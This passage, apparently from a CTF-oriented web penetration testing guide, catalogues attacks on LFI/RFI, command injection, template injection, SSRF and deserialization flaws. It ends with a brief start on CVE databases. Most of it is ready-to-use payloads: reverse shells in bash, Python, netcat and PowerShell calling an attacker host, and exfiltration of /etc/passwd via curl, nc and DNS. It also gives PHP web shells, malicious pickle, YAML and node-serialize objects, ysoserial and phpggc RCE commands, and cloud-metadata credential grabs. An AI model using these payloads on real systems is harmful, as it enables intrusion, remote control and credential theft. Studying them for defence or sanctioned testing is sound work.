/proc/net/udp
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/syslog
/var/www/html/config.php
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.ssh/id_rsa
```

Windows:

```
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam
C:\windows\system32\config\system
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

**Bypass techniques:**

Null byte injection (PHP < 5.3.4):

```
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd%00.jpg
```

Double encoding:

```
?file=..%252f..%252f..%252fetc%252fpasswd
?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

Path truncation (depends on backend limitations):

```
?file=../../../../etc/passwd/./././././.[repeat]
?file=../../../../etc/passwd............[long string]
```

Extension bypass:

```
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00
?file=../../../../etc/passwd/.
?file=../../../../etc/passwd/..
```

Filter bypass:

```
# Bypass ../ filter
?file=....//....//....//etc/passwd
?file=..;/..;/..;/etc/passwd
?file=....\/....\/....\/etc/passwd

# Bypass string replacement
?file=....//....//....//etc/passwd
?file=/etc/passwd
?file=./../../etc/passwd
```

**PHP wrapper exploitation:**

PHP filter wrapper (base64 encode):

```
?file=php://filter/convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=config.php
?file=php://filter/read=string.rot13/resource=index.php
```

Decode output:

```bash
echo "encoded_string" | base64 -d
```

PHP input wrapper (RCE via POST data):

```bash
# Request
POST /page.php?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('whoami'); ?>

# Using curl
curl -X POST http://target/page.php?file=php://input -d "<?php system('id'); ?>"
```

Data wrapper (inline code execution):

```
?file=data://text/plain,<?php system('id'); ?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

Expect wrapper (requires expect extension):

```
?file=expect://id
?file=expect://whoami
```

**Log poisoning (LFI to RCE):**

Apache/Nginx log poisoning:

```bash
# 1. Inject PHP code into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/

# 2. Include log file
http://target/page.php?file=../../../../var/log/apache2/access.log&cmd=whoami

# Alternative: Poison via SSH logs
ssh '<?php system($_GET["cmd"]); ?>'@target
http://target/page.php?file=../../../../var/log/auth.log&cmd=id
```

**Session file poisoning:**

```php
# 1. Inject code into session
http://target/index.php?session_var=<?php system('id'); ?>

# 2. Include session file (PHP default location)
?file=../../../../var/lib/php/sessions/sess_[SESSION_ID]
?file=/tmp/sess_[SESSION_ID]
```

**RFI testing:**

Basic RFI:

```
?file=http://attacker.com/shell.txt
?file=//attacker.com/shell.txt
?file=\\attacker.com\share\shell.txt
```

Host malicious file:

```bash
# shell.txt
<?php system($_GET['cmd']); ?>

# Start HTTP server
python3 -m http.server 80
```

Bypass allow_url_include restrictions:

```
?file=http://attacker.com/shell.txt?
?file=http://attacker.com/shell.txt#
?file=http://attacker.com/shell.txt%00
```

**Automated LFI/RFI scanning:**

Using ffuf:

```bash
ffuf -u http://target/page.php?file=FUZZ -w /usr/share/wordlists/lfi.txt -fs 0

# Filter by response size
ffuf -u http://target/page.php?file=FUZZ -w lfi_list.txt -fs 1234
```

Using wfuzz:

```bash
wfuzz -c -z file,/usr/share/wordlists/lfi.txt http://target/page.php?file=FUZZ
wfuzz -c -z file,lfi_wordlist.txt --hc 404 http://target/index.php?page=FUZZ
```

Using dotdotpwn:

```bash
dotdotpwn -m http -h target -x 80 -f /etc/passwd -k "root:"
dotdotpwn -m http-url -u "http://target/page.php?file=TRAVERSAL" -k "root:"
```

### Command Injection Detection

Command injection occurs when applications execute system commands with unsanitized user input.

**Common vulnerable parameters:**

```
?cmd=
?exec=
?command=
?execute=
?ping=
?query=
?jump=
?code=
?reg=
?do=
?func=
?arg=
?option=
?load=
?process=
?step=
?read=
?function=
?req=
?feature=
?exe=
?module=
?payload=
?run=
?print=
```

**Basic command injection payloads:**

Unix/Linux:

```bash
; id
| id
|| id
& id
&& id
` id `
$( id )
; whoami
| whoami
`whoami`
$(whoami)
```

Windows:

```cmd
& whoami
| whoami
|| whoami
&& whoami
; whoami
%0a whoami
` whoami `
```

**Command chaining operators:**

```bash
;   # Execute regardless of previous command
|   # Pipe output to next command
||  # Execute if previous fails
&   # Execute in background (Unix) or sequential (Windows)
&&  # Execute if previous succeeds
`   # Command substitution
$() # Command substitution
%0a # Newline injection
```

**Blind command injection detection:**

Time-based detection (Unix):

```bash
; sleep 10
| sleep 10
|| sleep 10 ||
& sleep 10
&& sleep 10
`sleep 10`
$(sleep 10)
; ping -c 10 127.0.0.1
```

Time-based detection (Windows):

```cmd
& timeout 10
| ping -n 10 127.0.0.1
&& timeout /t 10
```

DNS-based detection (Burp Collaborator or interactsh):

```bash
; nslookup burp-collaborator-domain
| nslookup $(whoami).burp-collaborator-domain
; curl http://burp-collaborator-domain
; wget http://burp-collaborator-domain
; ping -c 1 burp-collaborator-domain
```

HTTP-based detection:

```bash
; curl http://attacker-ip/$(whoami)
; wget http://attacker-ip/?data=$(id|base64)
| curl http://attacker-ip -d "$(cat /etc/passwd)"
```

**Bypass techniques:**

Space bypass:

```bash
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

Blacklist bypass:

```bash
# Using wildcards
/bin/c?t /etc/p?sswd
/???/c?t /???/p?sswd

# Character encoding
c\at /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
c${21}at /etc/passwd

# Variable expansion
CMD=cat;$CMD /etc/passwd
CA=c;TB=at;$CA$TB /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

Command bypass techniques:

```bash
# Backslash
c\at /etc/passwd
w\h\o\a\m\i

# Quotes
c'a't /etc/passwd
c"a"t /etc/passwd
w"h"o"a"m"i"

# Hex encoding
$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")

# Unicode
/usr/bin/c\u0061t /etc/passwd
```

**Output exfiltration techniques:**

Out-of-band data exfiltration:

```bash
; curl http://attacker-ip/$(cat /etc/passwd | base64)
; wget --post-data "$(cat /etc/passwd)" http://attacker-ip
; cat /etc/passwd | nc attacker-ip 4444
```

DNS exfiltration:

```bash
; dig $(whoami).attacker-domain
; nslookup $(cat /etc/passwd | base64 | head -c 50).attacker-domain
```

**Common payloads for reverse shells:**

Bash:

```bash
; bash -i >& /dev/tcp/attacker-ip/4444 0>&1
| bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f
```

Python:

```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Netcat:

```bash
; nc attacker-ip 4444 -e /bin/bash
; rm -f /tmp/p; mknod /tmp/p p && nc attacker-ip 4444 0</tmp/p | /bin/bash 1>/tmp/p
```

PowerShell (Windows):

```powershell
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Automated command injection testing:**

Using commix:

```bash
commix -u "http://target/page.php?cmd=test"
commix -u "http://target/page.php?cmd=test" --level=3 --technique=T
commix --url="http://target/page.php" --data="cmd=test" --cookie="session=xyz"
```

Using Burp Suite Collaborator:

```bash
# Payload in parameter
; nslookup burp-collaborator-subdomain
```

### Template Injection Detection

Server-Side Template Injection (SSTI) occurs when user input is embedded into template engines without proper sanitization.

**Common template engines:**

- Jinja2 (Python/Flask)
- Twig (PHP/Symfony)
- Freemarker (Java)
- Velocity (Java)
- Smarty (PHP)
- Thymeleaf (Java)
- Pug/Jade (Node.js)
- ERB (Ruby)
- Handlebars (JavaScript)

**Detection payloads:**

Mathematical expressions:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

Expected responses if vulnerable:

```
49         # Template engine processes expression
{{7*7}}    # No processing (not vulnerable or wrong syntax)
```

**Polyglot detection payload:**

```
${{<%[%'"}}%\.
{{7*'7'}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

**Template engine identification:**

Jinja2 (Python/Flask):

```python
{{7*'7'}}                    # Returns: 7777777
{{config}}                   # Shows Flask config
{{self}}                     # Shows template object
{{''.class.mro()[1].subclasses()}}
```

Twig (PHP):

```php
{{7*'7'}}                    # Returns: 49
{{_self}}                    # Shows template object
{{_self.env}}
```

Freemarker (Java):

```java
${7*7}                       # Returns: 49
${7*'7'}                     # Returns: 7777777
<#assign ex="freemarker.template.utility.Execute"?new()>
```

Smarty (PHP):

```php
{7*7}                        # Returns: 49
{$smarty.version}
{php}echo `id`;{/php}
```

**Exploitation payloads:**

Jinja2 (Python) RCE:

```python
# Basic RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Alternative payload
{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Enumerate subclasses to find useful ones
{{''.__class__.__mro__[1].__subclasses__()}}

# Using lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

# Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Using namespace
{{namespace.__init__.__globals__.os.popen('id').read()}}

# Bypass filters
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Twig (PHP) RCE:

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

{{['id']|filter('system')}}

{{['cat /etc/passwd']|map('system')|join}}
```

Freemarker (Java) RCE:

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

<#assign ex="freemarker.template.utility.ObjectConstructor"?new()> ${ ex("java.lang.ProcessBuilder","id").start() }

${"freemarker.template.utility.Execute"?new()("id")}
```

Smarty (PHP) RCE:

```php
{php}echo `id`;{/php}

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

{system('cat /etc/passwd')}
```

Velocity (Java) RCE:

```java
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

ERB (Ruby) RCE:

```ruby
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= File.open('/etc/passwd').read %>
```

**Blind SSTI exploitation:**

Time-based detection:

```python
# Jinja2
{{range(1,10000000)|join}}

# Wait for 10 seconds
{%for i in range(1,10000000)%}{%endfor%}
```

Out-of-band detection:

```python
# Jinja2 - DNS exfiltration
{{config.__class__.__init__.__globals__['os'].popen('nslookup burp-collaborator').read()}}

# HTTP exfiltration
{{config.__class__.__init__.__globals__['os'].popen('curl http://attacker-ip').read()}}
```

**Automated SSTI testing:**

Using tplmap:

```bash
tplmap -u 'http://target/page?name=test'
tplmap -u 'http://target/page' --data 'name=test'
tplmap -u 'http://target/page?name=test' --os-shell
tplmap -u 'http://target/page?name=test' --upload /local/file /remote/path
```

Manual testing workflow:

```bash
# 1. Detection
{{7*7}}

# 2. Identification
{{7*'7'}}

# 3. Exploitation
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### SSRF Detection

Server-Side Request Forgery (SSRF) forces the server to make requests to unintended locations.

**Common vulnerable parameters:**

```
?url=
?uri=
?path=
?dest=
?redirect=
?link=
?image=
?file=
?fetch=
?load=
?proxy=
?website=
?api=
?endpoint=
?callback=
?return=
?continue=
?next=
```

**Basic SSRF detection:**

External server callback:

```
http://target/fetch?url=http://attacker-ip
http://target/fetch?url=http://burp-collaborator
http://target/fetch?url=http://webhook.site/unique-id
```

Internal service access:

```
http://target/fetch?url=http://localhost
http://target/fetch?url=http://127.0.0.1
http://target/fetch?url=http://0.0.0.0
http://target/fetch?url=http://[::1]
http://target/fetch?url=http://internal-service
```

**Port scanning via SSRF:**

```bash
# Scan localhost ports
http://target/fetch?url=http://127.0.0.1:22
http://target/fetch?url=http://127.0.0.1:80
http://target/fetch?url=http://127.0.0.1:443
http://target/fetch?url=http://127.0.0.1:3306
http://target/fetch?url=http://127.0.0.1:6379
http://target/fetch?url=http://127.0.0.1:8080

# Distinguish open vs closed by response time/content
```

**Cloud metadata exploitation:**

AWS:

```
http://target/fetch?url=http://169.254.169.254/latest/meta-data/
http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://target/fetch?url=http://169.254.169.254/latest/user-data/
http://target/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/
```

Google Cloud:

```
http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/
http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Azure:

```
http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

**Bypass techniques:**

Localhost bypass:

```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1        # Octal
http://2130706433        # Decimal
http://0x7f.0x0.0x0.0x1  # Hexadecimal
http://127.1
http://127.0.1
http://0:0:0:0:0:ffff:7f00:1  # IPv6
```

DNS-based bypass:

```
http://localtest.me         # Resolves to 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://169.254.169.254.nip.io
```

URL parser bypass:

```
http://target@127.0.0.1
http://127.0.0.1%00target.com
http://target.com#@127.0.0.1
http://target.com?@127.0.0.1
http://127.0.0.1%23target.com
```

Protocol smuggling:

```
dict://127.0.0.1:6379/CONFIG
gopher://127.0.0.1:6379/_CONFIG
file:///etc/passwd
ldap://127.0.0.1:389
tftp://127.0.0.1
```

Open redirect chain:

```
http://target/redirect?url=http://evil.com
http://target/fetch?url=http://target/redirect?url=http://127.0.0.1
```

**Gopher protocol exploitation:**

Redis exploitation via SSRF:

```bash
# URL-encode payload
gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html
gopher://127.0.0.1:6379/_CONFIG SET dbfilename shell.php
gopher://127.0.0.1:6379/_SET webshell "<?php system($_GET['cmd']); ?>"
gopher://127.0.0.1:6379/_SAVE
```

Generate gopher payload:

```python
import urllib.parse

commands = [
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SET webshell '<?php system($_GET[\"cmd\"]); ?>'",
    "SAVE"
]

payload = ""
for cmd in commands:
    payload += urllib.parse.quote(cmd.replace(" ", "${IFS}")) + "%0D%0A"

print(f"gopher://127.0.0.1:6379/_{payload}")
```

**Blind SSRF detection:**

Time-based:

```bash
# Request to internal service that times out
http://target/fetch?url=http://192.168.1.1:1234
```

DNS-based (Burp Collaborator/interactsh):

```bash
http://target/fetch?url=http://burp-collaborator-subdomain
http://target/fetch?url=http://unique-id.interact.sh
```

**Automated SSRF testing:**

Using ffuf:

```bash
# Port scan via SSRF
ffuf -u http://target/fetch?url=http://127.0.0.1:FUZZ -w ports.txt -mc all -fs 0

# Internal IP discovery
ffuf -u http://target/fetch?url=http://192.168.1.FUZZ -w <(seq 1 254) -mc all
```

Using SSRFmap:

```bash
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m redis
```

### Insecure Deserialization Detection

Insecure deserialization occurs when untrusted data is used to instantiate objects, potentially leading to code execution.

**Common serialization formats:**

- Java serialization (binary, starts with `AC ED 00 05` or `rO0` in base64)
- PHP serialization (text format: `O:`, `a:`, `s:`)
- Python pickle (binary, starts with `\x80` or base64)
- .NET ViewState (base64, starts with `/wE`)
- YAML
- JSON (with special type indicators)

**Detection methods:**

Identifying serialized data:

Java (base64):

```
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
```

Hex signature:

```
AC ED 00 05
```

PHP:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

Python pickle (base64):

```
gASVKAAAAAAAAACMCF9fbWFpbl9flIwEVXNlcpSTlCmBlH2UjARuYW1llIwFYWRtaW6Uc2Iu
```

.NET ViewState:

```
/wEPDwUKMTU4OTY0MjU5Mg9kFgICAw8WAh4HZW5jdHlwZQUJdGV4dC9odG1sZGRk
```

**PHP deserialization exploitation:**

Magic methods in PHP:

```php
__construct()   # Called on object creation
__destruct()    # Called on object destruction
__wakeup()      # Called on unserialize()
__toString()    # Called when object is treated as string
__call()        # Called when invoking inaccessible methods
```

Basic PHP object injection:

```php
# Original serialized object
O:4:"User":2:{s:4:"name";s:4:"test";s:4:"role";s:4:"user";}

# Modified to admin
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

PHP POP chain exploitation:

[Inference] Property-Oriented Programming (POP) chains link together existing class methods (gadgets) to achieve code execution, similar to ROP chains in binary exploitation.

Example gadget chain:

```php
# Serialize malicious object
<?php
class FileHandler {
    public $filename = "/var/www/html/shell.php";
    public $data = "<?php system($_GET['cmd']); ?>";
}

echo serialize(new FileHandler());
// O:11:"FileHandler":2:{s:8:"filename";s:26:"/var/www/html/shell.php";s:4:"data";s:30:"<?php system($_GET['cmd']); ?>";}
?>
```

**Java deserialization exploitation:**

Identifying Java serialization:

```bash
# Base64 starts with: rO0
# Hex starts with: AC ED 00 05
```

Common vulnerable libraries:

- Apache Commons Collections
- Spring Framework
- Groovy
- Apache Commons FileUpload

Using ysoserial:

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'ping attacker-ip' | base64

# Common payloads
java -jar ysoserial.jar CommonsCollections6 'wget http://attacker-ip/shell.sh -O /tmp/shell.sh'
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}'

# Exploiting with Burp
java -jar ysoserial.jar CommonsCollections6 'curl http://burp-collaborator' | base64 | tr -d '\n'
```

Common ysoserial gadget chains:

```bash
CommonsCollections1
CommonsCollections2
CommonsCollections5
CommonsCollections6
Spring1
Spring2
Groovy1
```

**Python pickle exploitation:**

Creating malicious pickle:

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('ping -c 1 attacker-ip',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

Reverse shell payload:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"'
        return (os.system, (cmd,))

print(base64.b64encode(pickle.dumps(RCE())))
```

**.NET ViewState exploitation:**

ViewState structure:

```
/wE... (base64 encoded)
```

Using ysoserial.net:

```powershell
# Generate payload
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping attacker-ip"

# With validation key and algorithm
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping attacker-ip" --validationkey="VALIDATION_KEY" --validationalg="SHA1" --generator="GENERATOR_VALUE"
```

Extracting ViewState keys:

```xml
# From web.config
<machineKey validationKey="[KEY]" decryptionKey="[KEY]" validation="SHA1" />
```

Using ViewState decoder:

```bash
# Decode ViewState
echo "[BASE64_VIEWSTATE]" | base64 -d | xxd

# Check for __VIEWSTATEGENERATOR parameter
# Extract validation algorithm from response headers or error messages
```

**YAML deserialization exploitation:**

YAML allows arbitrary object instantiation in some parsers (PyYAML, SnakeYAML).

Python (PyYAML) RCE:

```yaml
!!python/object/apply:os.system
args: ['ping attacker-ip']
```

Alternative Python payload:

```yaml
!!python/object/new:os.system
args: ['wget http://attacker-ip/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh']
```

Java (SnakeYAML) RCE:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-ip/exploit.jar"]
  ]]
]
```

Ruby RCE:

```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source
    current_user_source: 
      !ruby/object:Gem::Source::SpecificFile
      spec: &1 !ruby/object:Gem::StubSpecification
        loaded_from: "|curl http://attacker-ip"
```

**NodeJS deserialization exploitation:**

node-serialize RCE:

```javascript
// Original object
{"username":"test","role":"user"}

// Malicious IIFE (Immediately Invoked Function Expression)
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('ping attacker-ip', function(error, stdout, stderr) { console.log(stdout) });}()","role":"user"}
```

Alternative payload:

```javascript
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/attacker-ip/4444 0>&1\"', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

**Detecting deserialization vulnerabilities:**

Manual detection workflow:

1. Identify serialized data in:
    
    - Cookies
    - Hidden form fields
    - API request/response bodies
    - Session tokens
    - Authentication tokens
2. Decode and analyze:
    

```bash
# Base64 decode
echo "rO0ABXNy..." | base64 -d | xxd

# Check hex signature
AC ED 00 05    # Java
80 02 ...      # Python pickle
```

3. Modify and test:

```bash
# Change values
# Inject type confusion
# Add new properties
```

**Automated deserialization testing:**

Using Burp extensions:

- Java Deserialization Scanner
- Freddy (Deserialization Bug Finder)
- GadgetProbe

Using ysoserial:

```bash
# Test all payloads
for payload in CommonsCollections1 CommonsCollections2 CommonsCollections5 CommonsCollections6; do
  echo "[+] Testing $payload"
  java -jar ysoserial.jar $payload "ping -c 1 burp-collaborator" | base64
done
```

**Blind deserialization detection:**

DNS-based detection:

```bash
# Java
java -jar ysoserial.jar URLDNS "http://burp-collaborator-subdomain"

# Python pickle
import pickle
import base64
import os

class DNS:
    def __reduce__(self):
        return (os.system, ('nslookup burp-collaborator-subdomain',))

print(base64.b64encode(pickle.dumps(DNS())))
```

Time-based detection:

```bash
# Java - 10 second sleep
java -jar ysoserial.jar CommonsCollections6 "sleep 10" | base64

# Python
import pickle
import base64
import time

class Sleep:
    def __reduce__(self):
        return (time.sleep, (10,))

print(base64.b64encode(pickle.dumps(Sleep())))
```

**Common gadget sources for exploitation:**

Java:

```
commons-collections:commons-collections (versions < 3.2.2)
org.apache.commons:commons-collections4 (versions < 4.1)
org.springframework:spring-core
org.codehaus.groovy:groovy
```

Python:

```
PyYAML (unsafe load)
pickle/cPickle (any version)
jsonpickle
shelve
```

.NET:

```
System.Windows.Data.ObjectDataProvider
System.Configuration.Install.AssemblyInstaller
System.Activities.Presentation.WorkflowDesigner
TextFormattingRunProperties
```

**Protection bypass techniques:**

Type confusion:

```php
# Original
O:4:"User":1:{s:4:"role";s:4:"user";}

# Type confusion - integer as string
O:4:"User":1:{s:4:"role";i:1;}

# Null byte injection (PHP < 5.3)
O:4:"User":1:{s:8:"%00*%00role";s:5:"admin";}
```

Class name manipulation:

```php
# Case sensitivity bypass
O:4:"user":1:{s:4:"role";s:5:"admin";}  # lowercase
O:4:"USER":1:{s:4:"role";s:5:"admin";}  # uppercase
```

Property count mismatch:

```php
# Declare 2 properties, provide 3
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";s:10:"extra_prop";s:5:"value";}
```

**Exploitation helpers and tools:**

phpggc (PHP Generic Gadget Chains):

```bash
# List available gadgets
phpggc -l

# Generate payload
phpggc Monolog/RCE1 system id
phpggc Monolog/RCE1 system "bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'"

# Output formats
phpggc Monolog/RCE1 system id -b  # Base64
phpggc Monolog/RCE1 system id -u  # URL encode
phpggc Monolog/RCE1 system id -j  # JSON
```

ysoserial:

```bash
# List payloads
java -jar ysoserial.jar

# Generate and encode
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker-ip" | base64 | tr -d '\n'

# Test with netcat
java -jar ysoserial.jar CommonsCollections6 "nslookup burp-collaborator" | nc target 8080
```

marshalsec:

```bash
# Start LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker-ip:8000/#Exploit"

# Payload
ldap://attacker-ip:1389/Exploit
```

**Real-world exploitation scenarios:**

Jenkins deserialization:

```bash
# Target: Jenkins CLI
java -jar ysoserial.jar CommonsCollections1 "wget http://attacker-ip/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" | java -jar jenkins-cli.jar -s http://target:8080 groovy =
```

JBoss deserialization:

```bash
# Exploit /invoker/JMXInvokerServlet
java -jar ysoserial.jar CommonsCollections5 "ping attacker-ip" > payload.ser
curl http://target:8080/invoker/JMXInvokerServlet --data-binary @payload.ser
```

WebLogic T3 protocol:

```bash
# Using weblogic_cmd.py
python weblogic_cmd.py target 7001 "ping attacker-ip"
```

**Advanced detection techniques:**

Serialization format fingerprinting:

```python
import base64

def identify_serialization(data):
    try:
        decoded = base64.b64decode(data)
        
        # Java
        if decoded[:4] == b'\xac\xed\x00\x05':
            return "Java Serialization"
        
        # Python pickle
        if decoded[0:1] == b'\x80':
            return "Python Pickle (Protocol 2+)"
        
        # .NET Binary
        if decoded[:2] == b'\x00\x01':
            return ".NET Binary Formatter"
            
        # Check for text-based formats
        decoded_str = data
        if 'O:' in decoded_str and ':{' in decoded_str:
            return "PHP Serialization"
            
    except:
        pass
    
    return "Unknown or not serialized"
```

Content-based detection:

```bash
# Look for magic bytes in requests/responses
grep -r "rO0" .           # Java serialized (base64)
grep -r "AC ED 00 05" .   # Java serialized (hex)
grep -r 'O:[0-9]' .       # PHP serialized
grep -r '__reduce__' .    # Python pickle indicators
```

**Vulnerability validation:**

Proof of concept workflow:

1. Identify serialization format
2. Generate benign payload (DNS/HTTP callback)
3. Inject payload
4. Monitor for callback
5. Escalate to RCE if successful

Example validation:

```bash
# 1. Generate DNS callback payload
java -jar ysoserial.jar URLDNS "http://$(whoami).burp-collaborator.net" | base64 -w0

# 2. Inject into vulnerable parameter
curl -X POST http://target/endpoint -d "session=PAYLOAD" -H "Content-Type: application/x-www-form-urlencoded"

# 3. Check Burp Collaborator for DNS query with username
```

**Framework-specific considerations:**

Spring Framework:

```bash
# Common vulnerable endpoints
/jolokia
/actuator
/env
/trace

# ysoserial payload
java -jar ysoserial.jar Spring1 "curl http://attacker-ip"
```

Apache Struts:

```bash
# Struts2 OGNL injection leading to deserialization
Content-Type: %{(#_='multipart/form-data').(#[email protected]@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping attacker-ip').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())}
```

Ruby on Rails:

```bash
# Rails vulnerable to YAML deserialization through cookies
# Decode cookie
echo "COOKIE_VALUE" | base64 -d

# Generate malicious YAML
"\n--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y"
```

**Important related topics for CTF scenarios:**

- Magic hash exploitation in PHP type juggling
- Session token manipulation and forgery
- XML External Entity (XXE) injection combined with deserialization
- Prototype pollution in JavaScript/NodeJS
- Type confusion attacks across different languages

---

## Manual Vulnerability Research

### CVE Databases

**CVE (Common Vulnerabilities and Exposures)** databases provide standardized vulnerability identification and technical details. Understanding these resources enables targeted exploit research during CTF scenarios.

**cve.mitre.org** (CVE List) is the authoritative CVE source maintained by MITRE Corporation. Access the search interface:

```
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXXX
```

Search by CVE identifier (format: CVE-YEAR-NUMBER):

```
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
```

This returns the Log4Shell vulnerability affecting Apache Log4j. The page displays affected software, description, and references.

Advanced search with filters:

```
https://cve.mitre.org/cgi-bin/cvelist.cgi?vendor=apache&product=log4j&year=2021
```

Parameters filter results by vendor, product name, and year. [Inference] MITRE's CVE List provides vendor-neutral information but may lack technical exploit details compared to other databases.

Export CVE data in bulk for offline analysis. MITRE provides CSV exports:

```
https://cve.mitre.org/data/downloads/allitems.csv
```

Process locally to identify vulnerabilities affecting target software:

```bash
grep "Apache Log4j" allitems.csv | head -20
```

